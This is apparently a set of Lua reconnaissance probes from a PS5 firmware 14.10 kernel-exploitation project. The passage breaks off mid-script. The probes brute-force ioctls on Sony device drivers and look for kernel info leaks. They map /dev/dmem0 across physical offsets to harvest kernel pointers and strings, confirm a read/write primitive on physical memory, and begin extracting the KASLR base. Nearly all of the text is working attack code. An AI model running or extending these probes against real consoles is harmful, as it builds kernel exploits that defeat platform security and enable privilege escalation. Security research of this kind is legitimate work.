-- observe return values and check for info leaks in output buffers

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: DEVICE IOCTL FUZZ ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_open = 5, sc_close = 6, sc_ioctl = 54,
    sc_read = 3, sc_write = 4,
    sc_mmap = 477, sc_getpid = 20,
})

-- FreeBSD ioctl encoding: _IOC(inout, group, num, len)
-- inout: 0x20000000=IOC_OUT, 0x40000000=IOC_IN, 0x60000000=IOC_INOUT
-- group: 8 bits, num: 8 bits, len: 13 bits (shifted)
local IOC_OUT   = 0x40000000  -- kernel writes to user
local IOC_IN    = 0x80000000  -- user writes to kernel
local IOC_INOUT = 0xC0000000
local IOC_VOID  = 0x20000000

local function IOC(inout, group, num, len)
    -- _IOC(inout, group, num, len) = inout | ((len & 0x1FFF) << 16) | (group << 8) | num
    local g = group
    if type(group) == "string" then g = string.byte(group) end
    return inout + ((len % 0x2000) * 0x10000) + (g * 256) + num
end

local function IO(group, num) return IOC(IOC_VOID, group, num, 0) end
local function IOR(group, num, len) return IOC(IOC_OUT, group, num, len) end
local function IOW(group, num, len) return IOC(IOC_IN, group, num, len) end
local function IOWR(group, num, len) return IOC(IOC_INOUT, group, num, len) end

-- Devices to test
local devices = {
    "/dev/dmem0", "/dev/dmem1", "/dev/dmem2",
    "/dev/gc", "/dev/hid", "/dev/ajm", "/dev/camera",
    "/dev/dce", "/dev/dipsw", "/dev/notification0",
    "/dev/icc_configuration", "/dev/icc_power",
    "/dev/rng", "/dev/urandom",
}

-- Buffer for ioctl data (reused across calls)
local BUFSIZE = 4096
local iobuf = memory.alloc(BUFSIZE + 256)

local function try_ioctl(fd, cmd, label)
    -- Zero the buffer and fill with marker pattern
    for i = 0, BUFSIZE - 1, 8 do
        memory.write_qword(iobuf + i, 0xDEADBEEFDEADBEEF)
    end

    local ok, ret = pcall(function()
        return syscall.sc_ioctl(fd, cmd, iobuf)
    end)

    local rv = -999
    if ok then rv = ret:tonumber() end

    -- Check if kernel wrote to buffer (info leak check)
    local modified = 0
    local first_mod = -1
    local first_val = 0
    for i = 0, math.min(BUFSIZE - 8, 255), 8 do
        local lo = memory.read_dword(iobuf + i):tonumber()
        local hi = memory.read_dword(iobuf + i + 4):tonumber()
        if lo ~= 0xDEADBEEF or hi ~= 0xDEADBEEF then
            modified = modified + 1
            if first_mod < 0 then
                first_mod = i
                first_val = hi * 0x100000000 + lo
            end
        end
    end

    return rv, modified, first_mod, first_val, ok
end

-- ============================================================
-- PART 1: Open all devices and report
-- ============================================================
log("")
log("--- PART 1: opening devices ---")

local open_fds = {}
for _, path in ipairs(devices) do
    local ok, ret = pcall(function()
        return syscall.sc_open(path, 2):tonumber() -- O_RDWR=2
    end)
    local fd = -1
    if ok then fd = ret end
    if fd < 0 then
        -- Try read-only
        ok, ret = pcall(function()
            return syscall.sc_open(path, 0):tonumber() -- O_RDONLY=0
        end)
        if ok then fd = ret end
    end
    if fd >= 0 then
        open_fds[#open_fds + 1] = {path = path, fd = fd}
        log("  " .. path .. " fd=" .. fd)
    end
end
log("  opened " .. #open_fds .. "/" .. #devices)

-- ============================================================
-- PART 2: Known PS5 ioctl groups
-- Sony uses specific group bytes for their devices
-- ============================================================
log("")
log("--- PART 2: ioctl sweep per device ---")

-- Speculative ioctl commands to try on each device
-- Cover common patterns: void, read 4/8/64/256/4096 bytes
local function fuzz_device(path, fd)
    log("")
    log("  == " .. path .. " (fd=" .. fd .. ") ==")
    local hits = {}

    -- Try group letters commonly used by FreeBSD/Sony
    -- 'd' for dmem, 'G' for gc/gpu, 'H' for hid, 'A' for ajm/audio
    -- Also try the device-specific first char
    local first_char = path:match("/dev/(%a)")
    local groups = {
        string.byte("d"), string.byte("G"), string.byte("H"),
        string.byte("A"), string.byte("C"), string.byte("S"),
        string.byte("N"), string.byte("I"),
    }
    if first_char then
        -- Add uppercase and lowercase of device first letter
        groups[#groups + 1] = string.byte(first_char)
        groups[#groups + 1] = string.byte(first_char:upper())
        groups[#groups + 1] = string.byte(first_char:lower())
    end

    -- Remove duplicates
    local seen = {}
    local unique_groups = {}
    for _, g in ipairs(groups) do
        if not seen[g] then
            seen[g] = true
            unique_groups[#unique_groups + 1] = g
        end
    end

    for _, group in ipairs(unique_groups) do
        for num = 0, 31 do
            -- Try as IOR (kernel writes to us) with various sizes
            for _, sz in ipairs({0, 4, 8, 16, 32, 64, 128, 256, 1024}) do
                local cmd
                if sz == 0 then
                    cmd = IO(group, num)
                else
                    cmd = IOR(group, num, sz)
                end

                local rv, modified, first_mod, first_val, ok = try_ioctl(fd, cmd, "")

                if rv >= 0 or modified > 0 then
                    local tag = ""
                    if modified > 0 then tag = " LEAK:" .. modified .. "qw" end
                    if rv >= 0 then tag = tag .. " OK" end
                    hits[#hits + 1] = string.format(
                        "    cmd=0x%08x grp=%c num=%d sz=%d rv=%d%s",
                        cmd, group, num, sz, rv, tag)
                    if first_mod >= 0 then
                        hits[#hits + 1] = string.format(
                            "      first_mod@+%d = 0x%016x", first_mod, first_val)
                    end
                end
            end

            -- Also try IOW (we write to kernel)
            local cmd_w = IOW(group, num, 64)
            -- Fill buffer with zeros for write (safer than garbage)
            for i = 0, 63, 8 do
                memory.write_qword(iobuf + i, 0)
            end
            local wok, wret = pcall(function()
                return syscall.sc_ioctl(fd, cmd_w, iobuf)
            end)
            if wok and wret:tonumber() >= 0 then
                hits[#hits + 1] = string.format(
                    "    cmd=0x%08x grp=%c num=%d IOW(64) rv=%d ACCEPTED",
                    cmd_w, group, num, wret:tonumber())
            end
        end
    end

    if #hits > 0 then
        log("  HITS: " .. #hits)
        for _, h in ipairs(hits) do log(h) end
    else
        log("  no hits")
    end

    return hits
end

-- ============================================================
-- PART 3: Also try raw ioctl numbers (no encoding)
-- Some Sony drivers use non-standard ioctl numbering
-- ============================================================
local function fuzz_raw(path, fd)
    local hits = {}

    -- Try low numbers (some drivers use simple sequential numbers)
    for cmd = 0, 63 do
        local rv, modified = try_ioctl(fd, cmd, "")
        if rv >= 0 or modified > 0 then
            local tag = ""
            if modified > 0 then tag = " LEAK:" .. modified .. "qw" end
            hits[#hits + 1] = string.format(
                "    raw cmd=%d (0x%x) rv=%d%s", cmd, cmd, rv, tag)
        end
    end

    -- Try PS5-known ioctl ranges
    -- dmem ioctls are around 0x4008xxxx range
    for base = 0x40000000, 0xC0000000, 0x40000000 do
        for sub = 0, 0xFF, 0x10 do
            local cmd = base + sub * 0x10000
            local rv, modified = try_ioctl(fd, cmd, "")
            if rv >= 0 or modified > 0 then
                hits[#hits + 1] = string.format(
                    "    cmd=0x%08x rv=%d mod=%d", cmd, rv, modified)
            end
        end
    end

    if #hits > 0 then
        log("  RAW HITS on " .. path .. ": " .. #hits)
        for _, h in ipairs(hits) do log(h) end
    end
end

-- Run fuzzing on each open device
local total_hits = 0
for _, dev in ipairs(open_fds) do
    local hits = fuzz_device(dev.path, dev.fd)
    total_hits = total_hits + #hits
    fuzz_raw(dev.path, dev.fd)
end

-- Close all FDs
for _, dev in ipairs(open_fds) do
    pcall(function() syscall.sc_close(dev.fd) end)
end

log("")
log("total ioctl hits: " .. total_hits)
log("=== DEVICE IOCTL FUZZ DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
```

## probes/phase2_kernel_objects/15_dmem_deep.lua

```lua
-- 14.10 Recon Probe 15: Deep dmem/gc/dce ioctl probing
-- Focus on known PS5 device ioctl structures
-- dmem: direct memory allocator (GPU visible memory)
-- gc: GPU command submission
-- dce: display controller engine
-- These are the most complex Sony kernel drivers with the largest attack surface

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: DEVICE DEEP DIVE ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_open = 5, sc_close = 6, sc_ioctl = 54,
    sc_mmap = 477, sc_munmap = 73, sc_getpid = 20,
})

-- Open key devices
local function dev_open(path)
    local ok, ret = pcall(function() return syscall.sc_open(path, 2):tonumber() end)
    if ok and ret >= 0 then return ret end
    ok, ret = pcall(function() return syscall.sc_open(path, 0):tonumber() end)
    if ok and ret >= 0 then return ret end
    return -1
end

local dmem_fd = dev_open("/dev/dmem0")
local gc_fd = dev_open("/dev/gc")
local dce_fd = dev_open("/dev/dce")
local ajm_fd = dev_open("/dev/ajm")
local hid_fd = dev_open("/dev/hid")
local dipsw_fd = dev_open("/dev/dipsw")

log("dmem0=" .. dmem_fd .. " gc=" .. gc_fd .. " dce=" .. dce_fd ..
    " ajm=" .. ajm_fd .. " hid=" .. hid_fd .. " dipsw=" .. dipsw_fd)

local buf = memory.alloc(8192)

local function do_ioctl(fd, cmd, size)
    -- Zero buffer
    for i = 0, math.min(size, 4096) - 1, 8 do
        memory.write_qword(buf + i, 0)
    end
    local ok, ret = pcall(function()
        return syscall.sc_ioctl(fd, cmd, buf)
    end)
    if ok then return ret:tonumber() else return -999 end
end

local function do_ioctl_check(fd, cmd, size, label)
    -- Fill with marker
    for i = 0, math.min(size, 4096) - 1, 8 do
        memory.write_qword(buf + i, 0)
    end
    local ok, ret = pcall(function()
        return syscall.sc_ioctl(fd, cmd, buf)
    end)
    local rv = ok and ret:tonumber() or -999

    -- Read back first 64 bytes
    local vals = {}
    for i = 0, math.min(63, size - 1), 8 do
        local lo = memory.read_dword(buf + i):tonumber()
        local hi = memory.read_dword(buf + i + 4):tonumber()
        if lo ~= 0 or hi ~= 0 then
            vals[#vals + 1] = string.format("+%d:0x%08x%08x", i, hi, lo)
        end
    end

    local data = ""
    if #vals > 0 then data = " [" .. table.concat(vals, " ") .. "]" end
    log(string.format("  %-40s rv=%d%s", label, rv, data))
    return rv
end

-- ============================================================
-- PART 1: dmem0 — known ioctl numbers from PS5 SDK/homebrew
-- dmem ioctls use _IOWR('d', N, struct) pattern
-- Known commands from PS5 homebrew scene:
-- ============================================================
log("")
log("--- PART 1: dmem0 known ioctls ---")

if dmem_fd >= 0 then
    -- DMEM_ALLOC: allocate direct memory
    -- From homebrew: ioctl(fd, DMEM_ALLOC_CMD, &args)
    -- Try various command encodings
    -- Known: 0xC0184401 = _IOWR('D', 1, 24) — dmem alloc
    -- Also: 0xC0184402 = _IOWR('D', 2, 24) — dmem query

    -- Try Sony's known ioctl group 'D' (0x44)
    for num = 0, 15 do
        for _, sz in ipairs({8, 16, 24, 32, 48, 64, 128, 256}) do
            local cmd = 0xC0004400 + num + (sz * 0x10000) -- IOWR('D', num, sz)
            local rv = do_ioctl(dmem_fd, cmd, sz)
            if rv >= 0 then
                log(string.format("  IOWR('D',%d,%d) = 0x%08x: rv=%d *** SUCCESS ***", num, sz, cmd, rv))
            elseif rv ~= -999 then
                -- Check if it was processed (not just ENOTTY)
                -- EINVAL=22 means it was processed, ENOTTY=25 means unknown
                local errno = memory.read_dword(buf):tonumber()
            end
        end
    end

    -- Try specific known PS5 dmem ioctls
    -- sceKernelAllocateDirectMemory -> ioctl on dmem
    -- The ioctl cmd format on PS5: lower 16 bits = command, upper = flags/size
    -- Try sequential raw commands
    log("")
    log("  raw sequential scan 0-255...")
    for cmd = 0, 255 do
        local rv = do_ioctl(dmem_fd, cmd, 256)
        if rv >= 0 then
            log(string.format("    cmd=%d (0x%x): rv=%d SUCCESS", cmd, cmd, rv))
        end
    end

    -- dmem mmap test: can we mmap the dmem device?
    log("")
    log("  mmap test on dmem0...")
    local mmap_ok, mmap_ret = pcall(function()
        return syscall.sc_mmap(0, 0x4000, 3, 1, dmem_fd, 0)
    end)
    if mmap_ok then
        local addr = mmap_ret:tonumber()
        if addr ~= 0 and addr ~= 0xFFFFFFFFFFFFFFFF then
            log("    mmap SUCCESS at " .. string.format("0x%x", addr))
            -- Read first bytes
            local v0 = memory.read_qword(addr):tonumber()
            local v1 = memory.read_qword(addr + 8):tonumber()
            log(string.format("    data: 0x%016x 0x%016x", v0, v1))
            pcall(function() syscall.sc_munmap(addr, 0x4000) end)
        else
            log("    mmap returned " .. string.format("0x%x", addr))
        end
    else
        log("    mmap failed: " .. tostring(mmap_ret):sub(1, 40))
    end
end

-- ============================================================
-- PART 2: dipsw — DIP switch device (security config)
-- Often has simple read ioctls that return system flags
-- ============================================================
log("")
log("--- PART 2: dipsw ---")

if dipsw_fd >= 0 then
    -- dipsw typically uses read()/ioctl() to return flag bits
    -- Try reading from it
    local read_buf = memory.alloc(256)
    local rok, rret = pcall(function()
        return syscall.sc_read(dipsw_fd, read_buf, 256)
    end)
    if rok then
        local nbytes = rret:tonumber()
        log("  read() returned " .. nbytes .. " bytes")
        if nbytes > 0 then
            local hex = {}
            for i = 0, math.min(nbytes - 1, 31) do
                hex[#hex + 1] = string.format("%02x", memory.read_byte(read_buf + i):tonumber())
            end
            log("    data: " .. table.concat(hex, " "))
        end
    else
        log("  read() failed: " .. tostring(rret):sub(1, 40))
    end

    -- Scan ioctls: dipsw might use group 'S' (security) or 'D'
    for _, group in ipairs({0x53, 0x44, 0x64, 0x73}) do -- S, D, d, s
        for num = 0, 31 do
            local cmd = 0x40000000 + (4 * 0x10000) + (group * 256) + num -- IOR(g,n,4)
            do_ioctl_check(dipsw_fd, cmd, 256,
                string.format("IOR('%c',%d,4)", group, num))
        end
    end
end

-- ============================================================
-- PART 3: gc (GPU) — command submission / info queries
-- ============================================================
log("")
log("--- PART 3: gc (GPU) ---")

if gc_fd >= 0 then
    -- GC likely has info query ioctls
    -- Try reading
    local gc_read = memory.alloc(256)
    local grok, grret = pcall(function()
        return syscall.sc_read(gc_fd, gc_read, 256)
    end)
    log("  read(): " .. (grok and tostring(grret:tonumber()) or "FAIL"))

    -- Try known GPU ioctl patterns
    -- Group 'G' (0x47) or 'g' (0x67)
    for _, group in ipairs({0x47, 0x67}) do
        for num = 0, 15 do
            -- IOR: kernel writes back to us (info queries)
            local cmd_r = 0x40000000 + (256 * 0x10000) + (group * 256) + num
            do_ioctl_check(gc_fd, cmd_r, 256,
                string.format("IOR('%c',%d,256)", group, num))
        end
    end

    -- mmap test
    log("")
    log("  mmap test on gc...")
    local gc_mmap_ok, gc_mmap_ret = pcall(function()
        return syscall.sc_mmap(0, 0x4000, 3, 1, gc_fd, 0)
    end)
    if gc_mmap_ok then
        local addr = gc_mmap_ret:tonumber()
        if addr ~= 0 and addr ~= 0xFFFFFFFFFFFFFFFF then
            log("    mmap SUCCESS at " .. string.format("0x%x", addr))
            local v0 = memory.read_qword(addr):tonumber()
            log(string.format("    first qword: 0x%016x", v0))
            pcall(function() syscall.sc_munmap(addr, 0x4000) end)
        else
            log("    mmap returned " .. string.format("0x%x", addr))
        end
    else
        log("    mmap failed")
    end
end

-- ============================================================
-- PART 4: dce (display controller)
-- ============================================================
log("")
log("--- PART 4: dce ---")

if dce_fd >= 0 then
    for _, group in ipairs({0x44, 0x64, 0x45}) do -- D, d, E
        for num = 0, 15 do
            local cmd_r = 0x40000000 + (64 * 0x10000) + (group * 256) + num
            do_ioctl_check(dce_fd, cmd_r, 256,
                string.format("IOR('%c',%d,64)", group, num))
        end
    end
end

-- ============================================================
-- PART 5: notification0 — might expose system events
-- ============================================================
log("")
log("--- PART 5: notification0 ---")

local notif_fd = dev_open("/dev/notification0")
if notif_fd >= 0 then
    log("  fd=" .. notif_fd)

    -- Read test
    local nread_buf = memory.alloc(4096)
    local nrok, nrret = pcall(function()
        return syscall.sc_read(notif_fd, nread_buf, 4096)
    end)
    log("  read(): " .. (nrok and tostring(nrret:tonumber()) or "FAIL"))

    -- Ioctl scan: 'N' group
    for num = 0, 15 do
        local cmd = 0x40000000 + (256 * 0x10000) + (0x4E * 256) + num -- IOR('N',n,256)
        do_ioctl_check(notif_fd, cmd, 256,
            string.format("IOR('N',%d,256)", num))
    end

    pcall(function() syscall.sc_close(notif_fd) end)
end

-- ============================================================
-- PART 6: Try the PS5-specific ioctl encoding
-- PS5 uses some non-standard ioctl encoding for certain drivers
-- Specifically: upper 16 bits encode the driver/function ID
-- Try scanning with known PS5 driver IDs
-- ============================================================
log("")
log("--- PART 6: PS5-specific ioctl scan ---")

-- PS5 known driver ioctl bases (from reverse engineering)
local ps5_bases = {
    {0xC0184401, "sceKernelAllocateDirectMemory"},
    {0xC0184402, "sceKernelMapDirectMemory?"},
    {0x80084403, "sceKernelGetDirectMemorySize?"},
    {0xC0284404, "sceKernelAllocateMainDirectMemory?"},
    {0xC0104405, "sceKernelBatchMap?"},
    {0x40084406, "sceKernelCheckedReleaseDirectMemory?"},
    {0xC0104407, "sceKernelDirectMemoryQuery?"},
    {0x40044408, "sceKernelAvailableDirectMemory?"},
}

if dmem_fd >= 0 then
    for _, spec in ipairs(ps5_bases) do
        local cmd = spec[1]
        local name = spec[2]
        -- Extract size from ioctl encoding
        local encoded_sz = math.floor(cmd / 0x10000) % 0x2000
        do_ioctl_check(dmem_fd, cmd, math.max(encoded_sz, 64), name)
    end
end

-- Also try on gc
if gc_fd >= 0 then
    local gc_cmds = {
        {0xC0104700, "gc submit?"},
        {0x40084701, "gc query?"},
        {0xC0204702, "gc map?"},
        {0x80104703, "gc info?"},
    }
    for _, spec in ipairs(gc_cmds) do
        do_ioctl_check(gc_fd, spec[1], 256, spec[2])
    end
end

-- Close all
for _, fd in ipairs({dmem_fd, gc_fd, dce_fd, ajm_fd, hid_fd, dipsw_fd}) do
    if fd >= 0 then pcall(function() syscall.sc_close(fd) end) end
end

log("")
log("=== DEVICE DEEP DIVE DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
```

## probes/phase2_kernel_objects/16_dmem_mmap.lua

```lua
-- 14.10 Recon Probe 16: dmem0 mmap physical memory scan
-- Probe 15 showed mmap(dmem0, offset=0) succeeds with real data
-- Strategy: mmap at various offsets to map different physical pages
-- Look for kernel structures, page tables, process lists, cred structs

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: DMEM MMAP SCAN ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_open = 5, sc_close = 6,
    sc_mmap = 477, sc_munmap = 73,
    sc_getpid = 20,
})

local dmem_fd = -1
local ok, ret = pcall(function() return syscall.sc_open("/dev/dmem0", 2):tonumber() end)
if ok and ret >= 0 then dmem_fd = ret end
if dmem_fd < 0 then
    ok, ret = pcall(function() return syscall.sc_open("/dev/dmem0", 0):tonumber() end)
    if ok and ret >= 0 then dmem_fd = ret end
end
log("dmem0 fd: " .. dmem_fd)
if dmem_fd < 0 then
    log("FATAL: cannot open dmem0")
    return table.concat(out, "\n")
end

local PAGE = 0x4000 -- 16KB (PS5 uses 16KB pages)
local PROT_READ = 1
local PROT_RW = 3
local MAP_SHARED = 1

-- ============================================================
-- PART 1: Confirm base mapping and dump first page
-- ============================================================
log("")
log("--- PART 1: base mapping dump ---")

local base_ok, base_ret = pcall(function()
    return syscall.sc_mmap(0, PAGE, PROT_READ, MAP_SHARED, dmem_fd, 0)
end)
local base_addr = 0
if base_ok then base_addr = base_ret:tonumber() end

if base_addr == 0 or base_addr == 0xFFFFFFFFFFFFFFFF then
    log("base mmap failed")
    -- Try with PROT_RW
    base_ok, base_ret = pcall(function()
        return syscall.sc_mmap(0, PAGE, PROT_RW, MAP_SHARED, dmem_fd, 0)
    end)
    if base_ok then base_addr = base_ret:tonumber() end
end

if base_addr ~= 0 and base_addr ~= 0xFFFFFFFFFFFFFFFF then
    log("mapped at " .. string.format("0x%x", base_addr))

    -- Dump first 256 bytes as qwords
    log("  first 256 bytes:")
    for i = 0, 248, 8 do
        local lo = memory.read_dword(base_addr + i):tonumber()
        local hi = memory.read_dword(base_addr + i + 4):tonumber()
        if lo ~= 0 or hi ~= 0 then
            log(string.format("    +%04x: %08x%08x", i, hi, lo))
        end
    end

    -- Scan full page for pointer-like values
    local ptrs = {}
    for i = 0, PAGE - 8, 8 do
        local lo = memory.read_dword(base_addr + i):tonumber()
        local hi = memory.read_dword(base_addr + i + 4):tonumber()
        if hi >= 0xFFFF0000 then
            ptrs[#ptrs + 1] = {off = i, hi = hi, lo = lo}
        end
    end
    if #ptrs > 0 then
        log("  kernel pointers found: " .. #ptrs)
        for j = 1, math.min(20, #ptrs) do
            local p = ptrs[j]
            log(string.format("    +%04x: 0x%08x%08x", p.off, p.hi, p.lo))
        end
    else
        log("  no kernel pointers in first page")
    end

    pcall(function() syscall.sc_munmap(base_addr, PAGE) end)
else
    log("base mmap failed completely")
end

-- ============================================================
-- PART 2: Scan offsets — map at various physical offsets
-- PS5 has 16GB RAM, so offsets up to 0x400000000
-- Try powers of 2 and interesting physical ranges
-- ============================================================
log("")
log("--- PART 2: offset scan ---")

local offsets = {
    0x0, 0x4000, 0x8000, 0x10000, 0x40000, 0x100000,
    0x200000, 0x400000, 0x800000, 0x1000000,
    0x2000000, 0x4000000, 0x8000000, 0x10000000,
    0x20000000, 0x40000000, 0x80000000,
    0x100000000, 0x200000000, 0x300000000,
}

local mapped_offsets = {}

for _, offset in ipairs(offsets) do
    local m_ok, m_ret = pcall(function()
        return syscall.sc_mmap(0, PAGE, PROT_READ, MAP_SHARED, dmem_fd, offset)
    end)
    local addr = 0
    if m_ok then addr = m_ret:tonumber() end

    if addr ~= 0 and addr ~= 0xFFFFFFFFFFFFFFFF then
        -- Read first 4 qwords
        local q0_lo = memory.read_dword(addr):tonumber()
        local q0_hi = memory.read_dword(addr + 4):tonumber()
        local q1_lo = memory.read_dword(addr + 8):tonumber()
        local q1_hi = memory.read_dword(addr + 12):tonumber()
        local q2_lo = memory.read_dword(addr + 16):tonumber()
        local q2_hi = memory.read_dword(addr + 20):tonumber()
        local q3_lo = memory.read_dword(addr + 24):tonumber()
        local q3_hi = memory.read_dword(addr + 28):tonumber()

        -- Count non-zero qwords in the page
        local nonzero = 0
        local kptrs = 0
        for i = 0, PAGE - 8, 8 do
            local lo = memory.read_dword(addr + i):tonumber()
            local hi = memory.read_dword(addr + i + 4):tonumber()
            if lo ~= 0 or hi ~= 0 then nonzero = nonzero + 1 end
            if hi >= 0xFFFF0000 then kptrs = kptrs + 1 end
        end

        local tag = ""
        if kptrs > 0 then tag = " *** KPTRS:" .. kptrs .. " ***" end

        log(string.format("  off=0x%09x: mapped nz=%d%s", offset, nonzero, tag))
        log(string.format("    %08x%08x %08x%08x %08x%08x %08x%08x",
            q0_hi, q0_lo, q1_hi, q1_lo, q2_hi, q2_lo, q3_hi, q3_lo))

        mapped_offsets[#mapped_offsets + 1] = {
            offset = offset, addr = addr, nonzero = nonzero, kptrs = kptrs
        }

        pcall(function() syscall.sc_munmap(addr, PAGE) end)
    else
        log(string.format("  off=0x%09x: FAILED", offset))
    end
end

-- ============================================================
-- PART 3: Deep dive on offsets that had kernel pointers
-- Dump more data from interesting pages
-- ============================================================
log("")
log("--- PART 3: deep dump of interesting pages ---")

for _, entry in ipairs(mapped_offsets) do
    if entry.kptrs > 0 or entry.nonzero > 100 then
        local m_ok, m_ret = pcall(function()
            return syscall.sc_mmap(0, PAGE, PROT_READ, MAP_SHARED, dmem_fd, entry.offset)
        end)
        if m_ok then
            local addr = m_ret:tonumber()
            if addr ~= 0 and addr ~= 0xFFFFFFFFFFFFFFFF then
                log(string.format("  === offset 0x%09x (kptrs=%d nz=%d) ===",
                    entry.offset, entry.kptrs, entry.nonzero))

                -- Dump all kernel pointers
                for i = 0, PAGE - 8, 8 do
                    local lo = memory.read_dword(addr + i):tonumber()
                    local hi = memory.read_dword(addr + i + 4):tonumber()
                    if hi >= 0xFFFF0000 then
                        local tag = "KHIGH"
                        if hi >= 0xFFFFFFFF and lo >= 0x80000000 then
                            tag = "KTEXT"
                        elseif hi >= 0xFFFFF800 and hi < 0xFFFFFF00 then
                            tag = "DMAP"
                        end
                        log(string.format("    +%04x: 0x%08x%08x [%s]", i, hi, lo, tag))
                    end
                end

                -- Look for ASCII strings (process names, struct signatures)
                local strings = {}
                local cur = {}
                for i = 0, math.min(PAGE - 1, 4095) do
                    local b = memory.read_byte(addr + i):tonumber()
                    if b >= 32 and b < 127 then
                        cur[#cur + 1] = string.char(b)
                    else
                        if #cur >= 6 then
                            strings[#strings + 1] = {off = i - #cur, str = table.concat(cur)}
                        end
                        cur = {}
                    end
                end
                if #cur >= 6 then
                    strings[#strings + 1] = {off = PAGE - #cur, str = table.concat(cur)}
                end

                if #strings > 0 then
                    log("    strings found: " .. #strings)
                    for _, s in ipairs(strings) do
                        log(string.format("      +%04x: \"%s\"", s.off, s.str:sub(1, 60)))
                    end
                end

                pcall(function() syscall.sc_munmap(addr, PAGE) end)
            end
        end
    end
end

-- ============================================================
-- PART 4: Try larger mappings
-- ============================================================
log("")
log("--- PART 4: large mapping test ---")

local large_sizes = {0x10000, 0x40000, 0x100000, 0x400000, 0x1000000}
for _, sz in ipairs(large_sizes) do
    local m_ok, m_ret = pcall(function()
        return syscall.sc_mmap(0, sz, PROT_READ, MAP_SHARED, dmem_fd, 0)
    end)
    local addr = 0
    if m_ok then addr = m_ret:tonumber() end

    if addr ~= 0 and addr ~= 0xFFFFFFFFFFFFFFFF then
        -- Scan for kernel pointers across the whole mapping
        local kptr_count = 0
        local sample_ptrs = {}
        for i = 0, sz - 8, 4096 do -- sample every 4KB
            local lo = memory.read_dword(addr + i):tonumber()
            local hi = memory.read_dword(addr + i + 4):tonumber()
            if hi >= 0xFFFF0000 then
                kptr_count = kptr_count + 1
                if #sample_ptrs < 5 then
                    sample_ptrs[#sample_ptrs + 1] = string.format(
                        "+%06x:0x%08x%08x", i, hi, lo)
                end
            end
        end
        local ptrs_str = ""
        if #sample_ptrs > 0 then ptrs_str = " " .. table.concat(sample_ptrs, " ") end
        log(string.format("  size=0x%x: OK kptrs=%d%s", sz, kptr_count, ptrs_str))
        pcall(function() syscall.sc_munmap(addr, sz) end)
    else
        log(string.format("  size=0x%x: FAILED", sz))
    end
end

-- ============================================================
-- PART 5: Try dmem1 and dmem2 as well
-- ============================================================
log("")
log("--- PART 5: dmem1/dmem2 comparison ---")

for _, devpath in ipairs({"/dev/dmem1", "/dev/dmem2"}) do
    local dfd = -1
    local dok, dret = pcall(function() return syscall.sc_open(devpath, 0):tonumber() end)
    if dok and dret >= 0 then dfd = dret end
    if dfd < 0 then
        log("  " .. devpath .. ": cannot open")
    else
        local m_ok2, m_ret2 = pcall(function()
            return syscall.sc_mmap(0, PAGE, PROT_READ, MAP_SHARED, dfd, 0)
        end)
        local a2 = 0
        if m_ok2 then a2 = m_ret2:tonumber() end
        if a2 ~= 0 and a2 ~= 0xFFFFFFFFFFFFFFFF then
            local q0lo = memory.read_dword(a2):tonumber()
            local q0hi = memory.read_dword(a2 + 4):tonumber()
            local q1lo = memory.read_dword(a2 + 8):tonumber()
            local q1hi = memory.read_dword(a2 + 12):tonumber()

            -- Count kptrs
            local kp = 0
            for i = 0, PAGE - 8, 8 do
                local hi2 = memory.read_dword(a2 + i + 4):tonumber()
                if hi2 >= 0xFFFF0000 then kp = kp + 1 end
            end

            log(string.format("  %s: mapped kptrs=%d first=%08x%08x %08x%08x",
                devpath, kp, q0hi, q0lo, q1hi, q1lo))
            pcall(function() syscall.sc_munmap(a2, PAGE) end)
        else
            log("  " .. devpath .. ": mmap failed")
        end
        pcall(function() syscall.sc_close(dfd) end)
    end
end

-- ============================================================
-- PART 6: Write test — can we write to dmem0 mapping?
-- ============================================================
log("")
log("--- PART 6: write test ---")

local w_ok, w_ret = pcall(function()
    return syscall.sc_mmap(0, PAGE, PROT_RW, MAP_SHARED, dmem_fd, 0)
end)
local w_addr = 0
if w_ok then w_addr = w_ret:tonumber() end

if w_addr ~= 0 and w_addr ~= 0xFFFFFFFFFFFFFFFF then
    log("  RW map at " .. string.format("0x%x", w_addr))
    -- Read original value
    local orig_lo = memory.read_dword(w_addr + 256):tonumber()
    local orig_hi = memory.read_dword(w_addr + 260):tonumber()
    log(string.format("  original @+256: %08x%08x", orig_hi, orig_lo))

    -- Write test value
    local write_ok = pcall(function()
        memory.write_dword(w_addr + 256, 0x41424344)
    end)
    log("  write attempt: " .. (write_ok and "OK" or "FAILED"))

    if write_ok then
        -- Read back
        local new_lo = memory.read_dword(w_addr + 256):tonumber()
        log(string.format("  readback: %08x", new_lo))
        if new_lo == 0x41424344 then
            log("  *** WRITE CONFIRMED — we have R/W to physical memory! ***")
            -- Restore original
            memory.write_dword(w_addr + 256, orig_lo)
        end
    end

    pcall(function() syscall.sc_munmap(w_addr, PAGE) end)
else
    log("  RW mmap failed")
end

pcall(function() syscall.sc_close(dmem_fd) end)

log("")
log("=== DMEM MMAP SCAN DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
```

## probes/phase2_kernel_objects/17_dmem_kptr.lua

```lua
-- 14.10 Recon Probe 17: Deep dump of dmem0 offset 0 kernel pointers
-- Probe 16 found 5 kernel pointers at offset 0 including 0xffffffff2ec47fc0
-- This probe does a thorough dump to extract KASLR base

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: DMEM KPTR DUMP ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_open = 5, sc_close = 6,
    sc_mmap = 477, sc_munmap = 73,
    sc_getpid = 20,
})

local dmem_fd = -1
local ok, ret = pcall(function() return syscall.sc_open("/dev/dmem0", 0):tonumber() end)
if ok and ret >= 0 then dmem_fd = ret end
log("dmem0 fd: " .. dmem_fd)

local PAGE = 0x4000

-- ============================================================
-- PART 1: Full qword dump of offset 0 (first 16KB page)
-- ============================================================
log("")
log("--- PART 1: offset 0 full dump ---")

local addr = 0
local m_ok, m_ret = pcall(function()
